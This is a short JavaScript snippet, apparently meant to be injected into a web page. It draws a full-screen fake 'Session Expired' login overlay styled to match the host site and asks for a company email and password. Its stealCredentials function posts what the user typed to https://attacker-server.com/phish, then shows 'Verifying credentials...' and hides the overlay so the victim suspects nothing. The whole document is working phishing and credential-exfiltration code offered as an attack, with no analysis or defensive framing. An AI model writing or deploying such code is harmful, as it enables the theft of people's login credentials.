// Overlay a fake login prompt matching site's style
const fakeLogin = document.createElement('div');
fakeLogin.innerHTML = `
  <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:99999;font-family:Arial;">
    <div style="background:white;width:300px;margin:100px auto;padding:20px;border-radius:5px;box-shadow:0 0 10px rgba(0,0,0,0.3)">
      <h2 style="color:#d23f00">Session Expired</h2>
      <p>Please re-authenticate to continue:</p>
      <input type="email" id="phish-email" placeholder="Company Email" style="width:100%;padding:8px;margin:5px 0;border:1px solid #ccc">
      <input type="password" id="phish-pwd" placeholder="Password" style="width:100%;padding:8px;margin:5px 0;border:1px solid #ccc">
      <button onclick="stealCredentials()" style="background:#d23f00;color:white;border:none;padding:8px 15px;cursor:pointer">Sign In</button>
    </div>
  </div>
`;

document.body.appendChild(fakeLogin);

const stealCredentials = () => {
  const email = document.getElementById('phish-email').value;
  const pwd = document.getElementById('phish-pwd').value;
  
  fetch('https://attacker-server.com/phish', {
    method: 'POST',
    body: JSON.stringify({email, pwd}),
    mode: 'no-cors'
  });
  
  fakeLogin.innerHTML = '<p style="text-align:center">Verifying credentials...</p>';
  setTimeout(() => { fakeLogin.style.display = 'none'; }, 2000);
};
